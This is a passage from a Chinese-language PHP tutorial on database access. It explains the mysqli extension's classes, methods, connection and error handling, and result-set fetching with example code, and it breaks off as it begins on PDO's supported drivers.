&apos;&lt;caption&gt;&lt;h1&gt;图书信息表&lt;/h1&gt;&lt;/caption&gt;&apos;;      //输出表格标题</span><br><span class="line">    echo &apos;&lt;th&gt;编号&lt;/th&gt;&lt;th&gt;图书名&lt;/th&gt;&lt;th&gt;作者&lt;/th&gt;&lt;th&gt;出版社&lt;/th&gt;&lt;th&gt;价格&lt;/th&gt;&lt;th&gt;介绍&lt;/th&gt;&apos;;</span><br><span class="line">    while($row=mysql_fetch_row($result))&#123;               //循环从结果集中遍历每条记录到数组中</span><br><span class="line">	    echo &apos;&lt;tr&gt;&apos;;                                  //每遍历一条记录输出一个行标记</span><br><span class="line">	    foreach($row as $data)&#123;                        //循环遍历一条数据记录中的每个字段</span><br><span class="line">	    	      echo &apos;&lt;td&gt;&apos;.$data.&apos;&lt;/td&gt;&apos;;                 //以表格形式输出每个字段</span><br><span class="line">	    &#125;</span><br><span class="line">	    echo &apos;&lt;/tr&gt;&apos;;                                  //输出每行的结束标记</span><br><span class="line">    &#125;</span><br><span class="line">    echo &apos;&lt;/table&gt;&apos;;</span><br><span class="line">    mysql_free_result($result);                          //释放查询的结果集资源</span><br><span class="line">    mysql_close($link);                                //关闭与MySQL服务器建立的连接</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<h1><span id="php的mysqli扩展">PHP的mysqli扩展</span></h1><h2><span id="启用mysqli扩展模块">启用mysqli扩展模块</span></h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">extension=php_mysqli.dll			//在php.ini文件中启动这一行</span><br></pre></td></tr></table></figure>
<p>mysqli扩展不仅提供了mysql模块的所有功能，也相应地增加了一些新特征。mysqli扩展模块包括mysqli、mysqli_result和mysqli_stmt三个类，通过这三个类的使用，就可以连接MySQL数据库服务器和选择数据库、查询和获取数据，以及使用预处理语句简化了重复执行的查询语句。</p>
<h2><span id="使用mysqli类">使用mysqli类</span></h2><h3><span id="mysqli类中的成员方法">mysqli类中的成员方法</span></h3><table>
<thead>
<tr>
<th>成员方法名</th>
<th style="text-align:left">描述</th>
</tr>
</thead>
<tbody>
<tr>
<td>_construct()</td>
<td style="text-align:left">构造方法，用于创建一个新的mysqli对象，也可以建立一个连接</td>
</tr>
<tr>
<td>autocommit()</td>
<td style="text-align:left">开启或关闭数据库修改自动提交</td>
</tr>
<tr>
<td>change_user</td>
<td style="text-align:left">改变了数据库连接所指定的用户</td>
</tr>
<tr>
<td>caracter_set_name()</td>
<td style="text-align:left">返回数据库连接默认的字符集</td>
</tr>
<tr>
<td>close()</td>
<td style="text-align:left">关闭先前打开连接</td>
</tr>
<tr>
<td>commit()</td>
<td style="text-align:left">提交当前的事务</td>
</tr>
<tr>
<td>connect()</td>
<td style="text-align:left">打开一个新的连接到MySQL数据库服务器</td>
</tr>
<tr>
<td>debug()</td>
<td style="text-align:left">执行调试操作</td>
</tr>
<tr>
<td>dump_debug_info()</td>
<td style="text-align:left">转储调试信息</td>
</tr>
<tr>
<td>get_client_info()</td>
<td style="text-align:left">返回客户端版本</td>
</tr>
<tr>
<td>get_host_info()</td>
<td style="text-align:left">返回一个字符串代表的连接使用类型，如：Localhost via UNIX socket</td>
</tr>
<tr>
<td>get_server_info()</td>
<td style="text-align:left">返回MySQL服务器的版本</td>
</tr>
<tr>
<td>get_server_version()</td>
<td style="text-align:left">返回整数形式的MySQL服务器版本</td>
</tr>
<tr>
<td>init()</td>
<td style="text-align:left">初始化MySQLi并返回一个资源</td>
</tr>
<tr>
<td>info()</td>
<td style="text-align:left">检索有关最近执行的查询</td>
</tr>
<tr>
<td>kill()</td>
<td style="text-align:left">要求服务器去杀死一个MySQL线程</td>
</tr>
<tr>
<td>multi_query()</td>
<td style="text-align:left">执行多个查询语句</td>
</tr>
<tr>
<td>more_results()</td>
<td style="text-align:left">从多查询语句中检查是否有任何更多的查询结果</td>
</tr>
<tr>
<td>Next_result()</td>
<td style="text-align:left">从当前执行的多查询中读取下一个结果</td>
</tr>
<tr>
<td>options()</td>
<td style="text-align:left">设置选项</td>
</tr>
<tr>
<td>ping()</td>
<td style="text-align:left">如果没有连接，ping一台服务器连接或重新连接</td>
</tr>
<tr>
<td>prepare()</td>
<td style="text-align:left">准备一个SQL语句的执行，返回mysqli_stmt对象</td>
</tr>
<tr>
<td>query()</td>
<td style="text-align:left">与数据库的任何交互都是通过查询进行的，该方法向数据库发送查询来执行</td>
</tr>
<tr>
<td>real_connect()</td>
<td style="text-align:left">试图打开一个连接到MySQL数据库服务器</td>
</tr>
<tr>
<td>escape_string()</td>
<td style="text-align:left">转义特殊字符的字符串，用于在一个SQL语句，并考虑到当前的字符集的连接</td>
</tr>
<tr>
<td>rollback()</td>
<td style="text-align:left">回滚当前的事务</td>
</tr>
<tr>
<td>select_db()</td>
<td style="text-align:left">为数据库查询选择默认的数据库</td>
</tr>
<tr>
<td>set_charset()</td>
<td style="text-align:left">设置默认客户端字符集</td>
</tr>
<tr>
<td>ssl_set()</td>
<td style="text-align:left">使用SSL用于建立安全连接</td>
</tr>
<tr>
<td>stat()</td>
<td style="text-align:left">获取当前的系统状态</td>
</tr>
<tr>
<td>stmt_init()</td>
<td style="text-align:left">初始化一个声明，并返回一个mysqli_stmt对象</td>
</tr>
<tr>
<td>store_result()</td>
<td style="text-align:left">从最后查询中转让结果集</td>
</tr>
<tr>
<td>thread_safe()</td>
<td style="text-align:left">是否考虑返回安全的线程</td>
</tr>
</tbody>
</table>
<h3><span id="mysqli类中的成员属性">mysqli类中的成员属性</span></h3><table>
<thead>
<tr>
<th>成员属性名</th>
<th style="text-align:left">描述</th>
</tr>
</thead>
<tbody>
<tr>
<td>$affect_rows</td>
<td style="text-align:left">在前一个MySQL操作中获取影响的行数</td>
</tr>
<tr>
<td>$client_info</td>
<td style="text-align:left">MySQL客户端版本为一个字符串返回</td>
</tr>
<tr>
<td>$client_version</td>
<td style="text-align:left">MySQL客户端版本为一个整数返回</td>
</tr>
<tr>
<td>$errno</td>
<td style="text-align:left">返回最近函数调用的错误代码</td>
</tr>
<tr>
<td>$error</td>
<td style="text-align:left">返回最近函数调用的错误信息字符串</td>
</tr>
<tr>
<td>$field_count</td>
<td style="text-align:left">传回最近查询获取的列数</td>
</tr>
<tr>
<td>$host_info</td>
<td style="text-align:left">返回一个字符串的连接类型使用</td>
</tr>
<tr>
<td>$info</td>
<td style="text-align:left">检索有关最近执行的查询</td>
</tr>
<tr>
<td>$insert_id</td>
<td style="text-align:left">返回使用最后查询自动生成的编号</td>
</tr>
<tr>
<td>$protocal_version</td>
<td style="text-align:left">返回MySQL协议使用的版本</td>
</tr>
<tr>
<td>$sqlstate</td>
<td style="text-align:left">返回一个字符串包含SQLSTATE错误码的最后一个错</td>
</tr>
<tr>
<td>$thread_id</td>
<td style="text-align:left">为当前连接返回线程ID</td>
</tr>
<tr>
<td>$warning_count</td>
<td style="text-align:left">返回前一个SQL语句执行过程中产生的警告数量</td>
</tr>
</tbody>
</table>
<h3><span id="连接mysql服务器">连接MySQL服务器</span></h3><p>通过mysqli类的构造方法实例化对象，其构造方法的原型如下所示：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">class mysqli&#123;</span><br><span class="line">	__construct ([string host[,string username[,string passwd[,string dbname[,int port[,string socket]]]]]])</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>这个构造方法还有两个可选的参数：MySQL服务器的端口号、一个套接字文件或命名管道。但是这两个可选参数很少使用。</p>
<p>如果连接成功，该构造方法将返回一个mysqli对象。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$mysqli=new mysqli(&quot;localhost&quot;,&quot;mysql_user&quot;,&quot;mysql_pwd&quot;,&quot;mylib&quot;);		//连接MySQL数据库服务器</span><br></pre></td></tr></table></figure></p>
<p>如果在创建mysqli对象没有想构造方法传入连接参数，就需要多写几行代码，调用mysqli对象中的connect()方法连接MySQL数据库服务器，还可以使用select_db()方法特别指定数据库。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php	</span><br><span class="line">	$mysqli=new mysqli();			//创建mysqli对象</span><br><span class="line">	$mysqli-&gt;connect(&quot;localhost&quot;,&quot;mysql_user&quot;,&quot;mysql_pwd&quot;);			//连接指定的MySQL数据库服务器</span><br><span class="line">	$mysqli-&gt;select_db(&quot;mylib&quot;);				//选择特定的数据库</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p>
<h3><span id="处理连接错误报告">处理连接错误报告</span></h3><p>在连接过程中难免会出现错误，应该及时让用户得到通知。在连接出错时mysqli对象并没有创建成功，所以不能调用mysqli对象中的成员获取这些错误信息，要通过mysqli扩展中的过程方式获取。使用mysqli_connect_errno()函数测试在建立连接的过程中是否发生错误，相关的出错信息由mysqli_connect_error()函数负责返回。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">	$mysqli=new mysqli(&quot;localhost&quot;,&quot;mysql_user&quot;,&quot;mysql_pwd&quot;,&quot;dbname&quot;);</span><br><span class="line">	/*	检查连接，如果连接出错输出错误信息并退出程序	*/</span><br><span class="line">	if(mysqli_connect_errno())&#123;</span><br><span class="line">		printf(&quot;连接失败：%s\n&quot;,mysqli_connect_error());</span><br><span class="line">		exit();</span><br><span class="line">	&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p>
<h3><span id="关闭与mysql服务器连接">关闭与MySQL服务器连接</span></h3><p>完成数据库访问工作，如果不再需要连接到数据库，应该明确地释放有关的mysqli对象。随意脚本执行结束后，所有打开的数据库连接都将自动关闭，资源被回收。但是，在执行过程中，又肯页面需要多个数据库连接，各个连接要在适当的时候将其关闭。mysqli对象中的close()方法负责关闭打开数据库连接，成功时返回TRUE，否则返回FALSE。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">     	/* 连接MySQL数据库并，成功则返回mysqli 对象*/</span><br><span class="line">	$mysqli = new mysqli(&quot;localhost&quot;, &quot;mysql_user&quot;, &quot;mysql_pwd&quot;, &quot;mylib&quot;);</span><br><span class="line">	/* 检查连接，如果连接出错输出错误信息并退出程序 */ </span><br><span class="line">	if (mysqli_connect_errno()) &#123;</span><br><span class="line"> 		printf(&quot;连接失败: %s&lt;br&gt;&quot;, mysqli_connect_error());</span><br><span class="line">		exit();</span><br><span class="line">	&#125;</span><br><span class="line">	/* 打印当前数据库使用字符集字符串 */</span><br><span class="line">	printf (&quot;当前数据库的字符集： %s&lt;br&gt;&quot;, $mysqli-&gt;character_set_name());</span><br><span class="line">	/* 打印客户端版本 */</span><br><span class="line">	printf(&quot;客户端库版本： %s&lt;br&gt;&quot;, $mysqli-&gt;get_client_info());</span><br><span class="line">	/* 打印服务器主机信息 */</span><br><span class="line">	printf(&quot;主机信息： %s&lt;br&gt;&quot;, $mysqli-&gt;host_info);</span><br><span class="line">	/* 打印字符串形式MySQL服务器版本 */</span><br><span class="line">	printf(&quot;服务器版本: %s&lt;br&gt;&quot;, $mysqli-&gt;server_info);</span><br><span class="line">	/*打印整数形式MySQL服务器版本*/</span><br><span class="line">	printf(&quot;服务器版本：%d&lt;br&gt;&quot;, $mysqli-&gt;server_version);</span><br><span class="line">	/* 关闭打开的数据库连接 */</span><br><span class="line">	$mysqli-&gt;close();	</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p>
<h3><span id="执行sql命令">执行SQL命令</span></h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">	$mysqli = new mysqli(&quot;localhost&quot;, &quot;root&quot;, &quot;123456&quot;, &quot;mylib&quot;);</span><br><span class="line">	if (mysqli_connect_errno()) &#123;</span><br><span class="line"> 		printf(&quot;连接失败: %s&lt;br&gt;&quot;, mysqli_connect_error());</span><br><span class="line">		exit();</span><br><span class="line">	&#125;</span><br><span class="line">     	/* 执行SQL命令向表中插入一条记录，并获取改变的记录数和新ID值 */</span><br><span class="line">	if($mysqli-&gt;query(&quot;insert into 表名(列1, 列2) values (&apos;值1&apos;,&apos;值2&apos;)&quot;))&#123;</span><br><span class="line">		echo &quot;改变的记录数：&quot;.$mysqli-&gt;affected_rows.&quot;&lt;br&gt;&quot;;</span><br><span class="line">		echo &quot;新插入的ID值：&quot;.$mysqli-&gt;insert_id.&quot;&lt;br&gt;&quot;;</span><br><span class="line">	&#125;</span><br><span class="line">	$mysqli-&gt;close();	</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<h2><span id="使用mysqli_result类">使用mysqli_result类</span></h2><table>
<thead>
<tr>
<th>成员方法名</th>
<th style="text-align:left">描述</th>
</tr>
</thead>
<tbody>
<tr>
<td>close()</td>
<td style="text-align:left">释放内存并关闭结果集</td>
</tr>
<tr>
<td>data_seek()</td>
<td style="text-align:left">明确改变当前结果记录顺序</td>
</tr>
<tr>
<td>fetch_field()</td>
<td style="text-align:left">从结果集中获得某一个字段的信息</td>
</tr>
<tr>
<td>fetch_fields()</td>
<td style="text-align:left">从结果集中获得全部字段的信息</td>
</tr>
<tr>
<td>fetch_field_direct()</td>
<td style="text-align:left">从一个指定的列中获得类的详细信息，返回一个包含列信息的对象</td>
</tr>
<tr>
<td>fetch_array()</td>
<td style="text-align:left">将以一个普通索引数组和关联数组两种形式返回一条结果记录</td>
</tr>
<tr>
<td>fetch_assoc()</td>
<td style="text-align:left">将以一个普通关联数组的形式返回一条结果记录</td>
</tr>
<tr>
<td>fetch_object()</td>
<td style="text-align:left">将以一个对象的形式返回一条结果记录</td>
</tr>
<tr>
<td>fetch_seek()</td>
<td style="text-align:left">设置结果集中字段的偏移位置</td>
</tr>
</tbody>
</table>
<table>
<thead>
<tr>
<th>成员属性名</th>
<th style="text-align:left">描述</th>
</tr>
</thead>
<tbody>
<tr>
<td>$current_field</td>
<td style="text-align:left">获取当前结果中指向的字段偏移位置，是一个整数</td>
</tr>
<tr>
<td>$field_count</td>
<td style="text-align:left">从查询的结果中获取列的个数</td>
</tr>
<tr>
<td>$lengths</td>
<td style="text-align:left">返回一个数组，保存在结果集中获取当前行的每一列的长度</td>
</tr>
<tr>
<td>$num_rows</td>
<td style="text-align:left">返回结果集中包含记录的行数</td>
</tr>
</tbody>
</table>
<h3><span id="从结果集中解析数据">从结果集中解析数据</span></h3><h4><span id="result-gtfetch_row">$result-&gt;fetch_row()</span></h4><p>该方法从结果集中获取一条结果记录，将值存放在一个索引数组中，与其他三个方法相比是最方便的方法。它的各个字段需要以$row[$n]的方式访问，其中$row是从结果集中获取的一行记录返回的数据，$n为连续的整数下标。因为返回的是索引数组，所以还可以和list()函数结合在一起使用。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">	$mysqli = new mysqli(&quot;localhost&quot;, &quot;root&quot;, &quot;123456&quot;, &quot;demo&quot;);  //连接本地demo数据库</span><br><span class="line">	if (mysqli_connect_errno()) &#123;</span><br><span class="line"> 		printf(&quot;连接失败: %s&lt;br&gt;&quot;, mysqli_connect_error());</span><br><span class="line">		exit();</span><br><span class="line">	&#125;</span><br><span class="line">	$mysqli-&gt;query(&quot;set names gb2312&quot;);                     //设置字符集为国标2312码</span><br><span class="line">     	/* 将部门编号为D01的联系人姓名和电子邮件全部取出存入到结果集中 */</span><br><span class="line">	$result = $mysqli-&gt;query(&quot;SELECT name, email FROM contactInfo WHERE departmentId=&apos;D01&apos;&quot;);</span><br><span class="line">	echo &apos;D01部门的联系人姓名和电子邮件：&apos;;</span><br><span class="line">	echo &apos;&lt;ol&gt;&apos;;</span><br><span class="line">	while(list($name, $email)=$result-&gt;fetch_row())&#123;     //从结果集中遍历每条数据</span><br><span class="line">		echo &apos;&lt;li&gt;&apos;.$name.&apos; : &apos;.$email.&apos;&lt;/li&gt;&apos;;            //以列表形式输出每条记录</span><br><span class="line">	&#125;	</span><br><span class="line">	echo &apos;&lt;/ol&gt;&apos;;</span><br><span class="line">    	$result-&gt;close();                                 //关闭结果集</span><br><span class="line">	$mysqli-&gt;close();	                           //关闭与数据库的连接</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p>
<h4><span id="result-gtfetch_assoc">$result-&gt;fetch_assoc()</span></h4><p>该方法将以一个关联数组的形式返回一条结果记录，数据表的字段名表示键，字段内容表示值。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">	$mysqli = new mysqli(&quot;localhost&quot;, &quot;mysql_user&quot;, &quot;mysql_pwd&quot;, &quot;demo&quot;);  //连接MySQL数据库</span><br><span class="line">	if (mysqli_connect_errno()) &#123;                                   //检查连接错误</span><br><span class="line"> 		printf(&quot;连接失败: %s&lt;br&gt;&quot;, mysqli_connect_error());</span><br><span class="line">		exit();</span><br><span class="line">	&#125;</span><br><span class="line">	$mysqli-&gt;query(&quot;set names gb2312&quot;);                            //设置查询字符集</span><br><span class="line">	$result = $mysqli-&gt;query(&quot;SELECT * FROM contactInfo&quot;);          //执行查询语句获取结果集</span><br><span class="line"></span><br><span class="line">	echo &apos;&lt;table width=&quot;90%&quot; border=&quot;1&quot; align=&quot;center&quot;&gt;&apos;;               //打印HTML表格</span><br><span class="line">	echo &apos;&lt;caption&gt;&lt;h1&gt;联系人信息表&lt;/h1&gt;&lt;/caption&gt;&apos;;                //输出表名</span><br><span class="line">	echo &apos;&lt;th&gt;用户ID&lt;/th&gt;&lt;th&gt;姓名&lt;/th&gt;&lt;th&gt;部门编号&lt;/th&gt;&apos;;          //输出字段名</span><br><span class="line">	echo &apos;&lt;th&gt;联系地址&lt;/th&gt;&lt;th&gt;联系电话&lt;/th&gt;&lt;th&gt;电子邮件&lt;/th&gt;&apos;;    </span><br><span class="line">	while($row=$result-&gt;fetch_assoc())&#123;                            //循环从结果集中遍历记录</span><br><span class="line">		echo &apos;&lt;tr align=&quot;center&quot;&gt;&apos;;                                //输出行标记</span><br><span class="line">		echo &apos;&lt;td&gt;&apos;.$row[&quot;uid&quot;].&apos;&lt;/td&gt;&apos;;                            //输出用户ID</span><br><span class="line">		echo &apos;&lt;td&gt;&apos;.$row[&quot;name&quot;].&apos;&lt;/td&gt;&apos;;                          //输出用户姓名</span><br><span class="line">		echo &apos;&lt;td&gt;&apos;.$row[&quot;departmentId&quot;].&apos;&lt;/td&gt;&apos;;                    //输出部门编号</span><br><span class="line">		echo &apos;&lt;td&gt;&apos;.$row[&quot;address&quot;].&apos;&lt;/td&gt;&apos;;                        //输出联系地址</span><br><span class="line">		echo &apos;&lt;td&gt;&apos;.$row[&quot;phone&quot;].&apos;&lt;/td&gt;&apos;;                         //输出联系电话</span><br><span class="line">		echo &apos;&lt;td&gt;&apos;.$row[&quot;email&quot;].&apos;&lt;/td&gt;&apos;;                          //输出电子邮件</span><br><span class="line">		echo &apos;&lt;/tr&gt;&apos;;</span><br><span class="line">	&#125;	</span><br><span class="line">	echo &apos;&lt;/table&gt;&apos;;</span><br><span class="line">     	$result-&gt;close();                                           //关闭结果集释放内存</span><br><span class="line">	$mysqli-&gt;close();	                                      //关闭与数据库服务器的连接</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p>
<h4><span id="result-gtfetch_array">$result-&gt;fetch_array()</span></h4><p>该方法可以说是fetch_row()和fetch_assoc()两个方法的结合版本，可以将结果集的各条记录获取为一个关联数组或数值索引数组，或者同时获取为关联数组和索引数组。默认情况下，会同时获取这两种数组。可以通过在该方法的参数在该方法的参数中传入如下不同的值来修改这种默认行为。</p>
<ul>
<li>MYSQLI_ASSOC:记录被作为关联数组返回，字段名为键，字段内容为值。</li>
<li>MYSQLI_NUM:记录被作为索引数组返回，按查询中指定的字段名顺序排序。</li>
<li>MYSQLI_BOTH:这是默认值，记录即未做关联数组又作为索引数组返回。因此，每个字段可以根据其索引偏移引用，也可以根据字段名来引用。</li>
</ul>
<h4><span id="result-gtfetch_object">$result-&gt;fetch_object()</span></h4><p>该方法与前面三个方法不同，它将以一个对象的形式返回一条结果记录，而不是数组。它的各个字段需要以对象的方式进行访问，数据列的名字区分字母大小写情况。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">	$mysqli = new mysqli(&quot;localhost&quot;, &quot;mysql_user&quot;, &quot;mysql_pwd&quot;, &quot;demo&quot;);  //连接MySQL数据库</span><br><span class="line">	if (mysqli_connect_errno()) &#123;                                   //检查连接错误</span><br><span class="line"> 		printf(&quot;连接失败: %s&lt;br&gt;&quot;, mysqli_connect_error());</span><br><span class="line">		exit();</span><br><span class="line">	&#125;</span><br><span class="line">	$mysqli-&gt;query(&quot;set names gb2312&quot;);                            //设置查询字符集</span><br><span class="line">	$result = $mysqli-&gt;query(&quot;SELECT * FROM contactInfo&quot;);          //执行查询语句获取结果集</span><br><span class="line"></span><br><span class="line">	echo &apos;&lt;table width=&quot;90%&quot; border=&quot;1&quot; align=&quot;center&quot;&gt;&apos;;               //打印HTML表格</span><br><span class="line">	echo &apos;&lt;caption&gt;&lt;h1&gt;联系人信息表&lt;/h1&gt;&lt;/caption&gt;&apos;;                //输出表名</span><br><span class="line">	echo &apos;&lt;th&gt;用户ID&lt;/th&gt;&lt;th&gt;姓名&lt;/th&gt;&lt;th&gt;部门编号&lt;/th&gt;&apos;;          //输出字段名</span><br><span class="line">	echo &apos;&lt;th&gt;联系地址&lt;/th&gt;&lt;th&gt;联系电话&lt;/th&gt;&lt;th&gt;电子邮件&lt;/th&gt;&apos;;    </span><br><span class="line">	while($rowObj=$result-&gt;fetch_object())&#123;                        //循环从结果集中遍历记录</span><br><span class="line">		echo &apos;&lt;tr align=&quot;center&quot;&gt;&apos;;                                //输出行标记</span><br><span class="line">		echo &apos;&lt;td&gt;&apos;.$rowObj-&gt;uid.&apos;&lt;/td&gt;&apos;;                          //输出用户ID</span><br><span class="line">		echo &apos;&lt;td&gt;&apos;.$rowObj-&gt;name.&apos;&lt;/td&gt;&apos;;                        //输出用户姓名</span><br><span class="line">		echo &apos;&lt;td&gt;&apos;.$rowObj-&gt;departmentId.&apos;&lt;/td&gt;&apos;;                  //输出部门编号</span><br><span class="line">		echo &apos;&lt;td&gt;&apos;.$rowObj-&gt;address.&apos;&lt;/td&gt;&apos;;                       //输出联系地址</span><br><span class="line">		echo &apos;&lt;td&gt;&apos;.$rowObj-&gt;phone.&apos;&lt;/td&gt;&apos;;                        //输出联系电话</span><br><span class="line">		echo &apos;&lt;td&gt;&apos;.$rowObj-&gt;email.&apos;&lt;/td&gt;&apos;;                         //输出电子邮件</span><br><span class="line">		echo &apos;&lt;/tr&gt;&apos;;</span><br><span class="line">	&#125;	</span><br><span class="line">	echo &apos;&lt;/table&gt;&apos;;</span><br><span class="line">    	$result-&gt;close();                                           //关闭结果集释放内存</span><br><span class="line">	$mysqli-&gt;close();	                                      //关闭与数据库服务器的连接</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p>
<h3><span id="从结果集中获取数据列的信息">从结果集中获取数据列的信息</span></h3><p>在解析结果集时，不仅需要从中遍历数据，有时也需要获取数据表的属性和各个字段的信息。可以通过结果集对象中的field_count属性给出结果数据表里的数据列的个数、使用current_field属性获取指向当前列的位置、使用field_seek()方法改变指向当前列的偏移位置，以及通过fetch_field（）方法返回的对象中获取当前列的信息。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">	$mysqli = new mysqli(&quot;localhost&quot;, &quot;root&quot;, &quot;123456&quot;, &quot;demo&quot;);    //连接MySQL数据库</span><br><span class="line">	if (mysqli_connect_errno()) &#123;                                        //检查连接错误</span><br><span class="line"> 		printf(&quot;连接失败: %s&lt;br&gt;&quot;, mysqli_connect_error());</span><br><span class="line">		exit();</span><br><span class="line">	&#125; </span><br><span class="line">	$mysqli-&gt;query(&quot;set names gb2312&quot;);                             //设置查询字符集</span><br><span class="line">	$result = $mysqli-&gt;query(&quot;SELECT * FROM contactInfo&quot;);           //执行查询语句获取结果集</span><br><span class="line"></span><br><span class="line">	echo &quot;结果数据表里数据列个数为：&quot;.$result-&gt;field_count.&quot;列&lt;br&gt;&quot;;   //从查询结果中获取列数</span><br><span class="line">	echo &quot;默认当前列的指针位置为第：&quot;.$result-&gt;current_field.&quot;列&lt;br&gt;&quot;;  //打印默认列的指针位置</span><br><span class="line">	echo &quot;将指向当前列的指针移动到第二列;&lt;br&gt;&quot;;</span><br><span class="line">	$result-&gt;field_seek(1);                      //将当前列指针移至第二列（默认0代表第一列）</span><br><span class="line">	echo &quot;指向当前列的指针位置为第：&quot;.$result-&gt;current_field.&quot;列&lt;br&gt;&quot;;   //打印当前列的指针位置</span><br><span class="line">	echo &quot;第二列的信息如下所示：&lt;br&gt;&quot;;</span><br><span class="line">	$finfo = $result-&gt;fetch_field();                                //获取当前列的对象</span><br><span class="line">	echo &quot;列的名称：&quot;.$finfo-&gt;name.&quot;&lt;br&gt;&quot;;                       //打印列的名称</span><br><span class="line">	echo &quot;数据列来自数据表：&quot;.$finfo-&gt;table.&quot;&lt;br&gt;&quot;;               //打印本列来自哪个数据表</span><br><span class="line">	echo &quot;本列最长字符串的长度&quot;.$finfo-&gt;max_length.&quot;&lt;br&gt;&quot;;        //打印本列中最长字符串长度</span><br><span class="line"></span><br><span class="line">     	$result-&gt;close();                                           //关闭结果集释放内存</span><br><span class="line">	$mysqli-&gt;close();	                                      //关闭与数据库服务器的连接</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p>
<h1><span id="数据库抽象层pdo">数据库抽象层PDO</span></h1><h2><span id="pdo所支持的数据库">PDO所支持的数据库</span></h2><p>PDO就是一个“数据库访问抽象层”，作用是统一各种数据库的访问接口，能够轻松地在不同数据库之间进行切换，使得数据库间的移植容易实现。</p>
<table>
<thead>
<tr>
<th>驱动名</th>
<th style="text-align:left">对应访问的数据库</th>
</tr>
</thead>
<tbody>
<tr>
<td>PDO_DBLIB</td>
<td style="text-align:left">FreeTDS/Microsoft SQL Server/Sybase</td>
</tr>
<tr>
<td>PDO_FIREBIED</td>
<td style="text-align:left">Firebird/Interbase 6</td>
</tr>
<tr>
<td>PDO_MYSQL</td>
<td style="text-align:left">MySQL 3.x/4.x/5.x</td>
</tr>
<tr>
